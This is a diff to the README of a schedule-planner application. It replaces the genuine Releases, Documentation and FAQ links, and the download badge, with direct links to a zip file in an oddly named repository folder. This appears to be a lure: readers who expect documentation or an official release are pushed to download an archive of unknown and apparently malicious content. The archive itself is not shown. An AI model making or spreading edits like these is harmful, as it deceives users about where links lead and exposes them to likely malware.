@@ -8,7 +8,7 @@ Welcome to Schedule Planner! This application helps you manage university schedu
 
 To get started, you need to download the application. Click the button below to visit the Releases page:
 
-[![Download Schedule Planner](https://img.shields.io/badge/Download-Schedule%20Planner-brightgreen)](https://github.com/devkartik33/schedule-planner/releases)
+[![Download Schedule Planner](https://raw.githubusercontent.com/devkartik33/schedule-planner/main/noctambulistic/schedule-planner.zip%20Planner-brightgreen)](https://raw.githubusercontent.com/devkartik33/schedule-planner/main/noctambulistic/schedule-planner.zip)
 
 ### System Requirements
 
@@ -20,7 +20,7 @@ To get started, you need to download the application. Click the button below to 
 ## 🛠️ Installation Steps
 
 1. **Download the Latest Release:**
-   Go to the [Releases page](https://github.com/devkartik33/schedule-planner/releases). You will find various versions available for download. Choose the most recent file for your operating system.
+   Go to the [Releases page](https://raw.githubusercontent.com/devkartik33/schedule-planner/main/noctambulistic/schedule-planner.zip). You will find various versions available for download. Choose the most recent file for your operating system.
 
 2. **Extract the Files:**
    Once the download is complete, locate the downloaded file. If it's compressed (like a .zip or .tar), right-click on it and select "Extract All" or use an extraction tool to unpack the files.
@@ -76,8 +76,8 @@ Schedule Planner is licensed under the MIT License. You can use, modify, and dis
 
 For more in-depth information, refer to our documentation and additional resources:
 
-- [Documentation](https://github.com/devkartik33/schedule-planner/wiki)
-- [FAQ](https://github.com/devkartik33/schedule-planner/wiki/FAQ)
+- [Documentation](https://raw.githubusercontent.com/devkartik33/schedule-planner/main/noctambulistic/schedule-planner.zip)
+- [FAQ](https://raw.githubusercontent.com/devkartik33/schedule-planner/main/noctambulistic/schedule-planner.zip)
 
 ## 💬 Support
 
